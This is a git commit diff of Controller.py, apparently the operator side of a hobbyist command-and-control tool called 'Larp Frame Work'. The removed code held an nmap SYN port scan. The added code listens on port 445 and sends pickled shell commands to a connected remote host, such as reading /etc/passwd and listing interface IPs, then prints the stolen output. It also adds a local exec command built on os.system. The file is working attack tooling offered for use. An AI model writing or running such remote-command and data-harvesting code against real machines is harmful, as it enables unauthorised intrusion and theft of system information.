b2ac8174a5341667c9dde31f0607d76f651d7648
/etc/passwd <218783009+larplimiter14@users.noreply.github.com>
2026-03-13 23:15:31 +0100

    Added alot of improvements to the controller

--- Controller.py
+++ Controller.py
@@ -1,129 +1,92 @@
-import socket, time, nmap, threading
+import socket, os, pickle # pickle's my homeboy
+
+# Mostly requires root privileges locally
 
 HOST = "0.0.0.0"
-PORT = 4444
-otherPort = 445
+PORT = 445
+
+def execute(cmd):
+    print(f"\033[32m[+] Exec:\033[0m {cmd}\n")
+    if not cmd:
+        return
+    os.system(cmd)
 
 def recon_HostnameScan():
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as ss:
-            ss.bind((HOST,otherPort))
-            ss.listen()
-            conn, addr = ss.accept()
-            with conn:
-                print(f"\n[+] Connected to {addr}:{PORT}!")
-                while True:
-                    data = conn.recv(1024)
-                    if data:
-                        output = data.decode()
-                        print(f"\033[32m[!]\033[0m Success! IP's: {output}")
-                        break
-                    else:
-                        time.sleep(1)
-                        continue
-                ss.close()
-
-
-def recon_portscan():
-
-    PORTS_SERVICES = {
-        20: "FTP",
-        21: "FTP",
-        22: "SSH",
-        23: "Telnet",
-        25: "SMTP",
-        53: "DNS",
-        80: "HTTP",
-        110: "POP3",
-        143: "IMAP",
-        443: "HTTPS",
-        445: "SMB",
-        1716: "KDEConnect",
-        3389: "RDP"
-    }
-
-    target = input("[+] Enter target IP: ")
-
-    print("[+] Starting Nmap scan...\n")
-
-    scanner = nmap.PortScanner()
-
-    scanner.scan(target, arguments="-sS -p 1-1024")
-
-    for host in scanner.all_hosts():
-
-        print(f"\033[96m[+]\033[0m Host: {host}")
-        print(f"\033[96m[+]\033[0m State: {scanner[host].state()}")
-
-        for proto in scanner[host].all_protocols():
-
-            ports = scanner[host][proto].keys()
-
-            for port in sorted(ports):
-
-                state = scanner[host][proto][port]['state']
-                
-
-                service = PORTS_SERVICES.get(port, "Unknown")
-                if state == "open":
-                    print(f"[\033[96m{state.upper()}\033[0m] Port {port} | {service}")
-                else:
-                    print(f"[\033[91m{state.upper()}\033[0m] Port {port} | {service}")
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind((HOST,PORT))
+        s.listen()
+        conn, addr = s.accept()
+        with conn:
+            print("\033[32m[+]\033[0m Connected to RHOST!")
+            cmd = ["hostname -I", "__eoc__"]
+            cmd2 = pickle.dumps(cmd)
+            conn.sendall(cmd2)
+            print("\033[32m[+]\033[0m Sent payload to RHOST!")
+            data = b""
+            while True:
+                chunk = conn.recv(1024)
+                if not chunk:
+                    break
+                data += chunk
+            print("\033[32m[+]\033[0m STDOUT recieved:\n", data.decode(errors="ignore"))
+            s.close()
 
 def passwdRead():
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-                sock.bind((HOST,otherPort))
-                sock.listen()
-                conn, addr = sock.accept()
-                with conn:
-                    print(f"\n[+] Connected to {addr}:{PORT}!")
-                    while True:
-                        data = conn.recv(1024)
-                        if data:
-                            output = data.decode()
-                            print(f"\033[32m[+]\033[0m Success! stdout:\n {output}")
-                            break
-                        else:
-                            time.sleep(1)
-                            continue
-                    sock.close()
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind((HOST,PORT))
+        s.listen()
+        conn, addr = s.accept()
+        with conn:
+            print("\033[32m[+]\033[0m Connected to RHOST!")
+            cmd = ["cat /etc/passwd", "__eoc__"]
+            cmd2 = pickle.dumps(cmd)
+            conn.sendall(cmd2)
+            print("\033[32m[+]\033[0m Sent payload to RHOST!")
+            data = b""
+            while True:
+                chunk = conn.recv(1024)
+                if not chunk:
+                    break
+                data += chunk
+            print("\033[32m[+]\033[0m STDOUT recieved:\n", data.decode(errors="ignore"))
+            s.close()
 
 def helpmebigyahu():
     print("""--\033[34mLarp Frame Work manual\033[0m--
+---------\033[34mMISC\033[0m---------
 help - Display's this page.
-ScanPort - Scans HOST's ports.
+exec [command] - executes a command locally.
 ---- \033[34mACCESS NEEDED\033[0m ----
 HostnameScan - Scan's HOST's interface IP's.
 passwdRead - capture stdout of  /etc/passwd.""")
+
 print("\033[32m[+]\033[0m Enter HELP for MAN page.")
 
-print("Enter 'help' for MAN page.")
-
 while True:
-    picker = input("\033[34m(LFW)\033[0m \033[32m$\033[0m ")
-    if picker == "ScanPort":
-        recon_portscan()
-    elif picker == "help":
-        helpmebigyahu()
-    elif picker == "HostnameScan":
-        threading.Thread(target=recon_HostnameScan, daemon=False).start()
-        time.sleep(0.1)
-        with socket.socket() as s:
-            s.bind((HOST,PORT))
-            s.listen()
-            conn, addr = s.accept()
-            with conn:
-                hs = "hS"
-                conn.sendall(hs.encode())
-                s.close()
-    elif picker == "passwdRead":
-        threading.Thread(target=passwdRead, daemon=False).start()
-        time.sleep(0.1)
-        with socket.socket() as s:
-            s.bind((HOST,PORT))
-            s.listen()
-            conn, addr = s.accept()
-            with conn:
-                hs = "pR"
-                conn.sendall(hs.encode())
-                s.close()
-        
+    raw = input("\033[34m(LFW)\033[0m \033[32m$\033[0m ")
+    parts = raw.split()
+
+    if not parts:
+        continue
+
+    cmd = parts[0].lower()
+    args = parts[1:]
+
+    commands = {
+        "hostnamescan": recon_HostnameScan,
+        "exec": execute,
+        "passwdread": passwdRead,
+        "help": helpmebigyahu
+    }
+
+    if cmd in commands:
+        if cmd == "exec":
+            command = " ".join(args)
+            execute(command)
+        else:
+            commands[cmd]()
+    else:
+        print(f"\033[31m[-]\033[0m Unknown command. Did you mean 'exec {cmd}?'")
+        continue
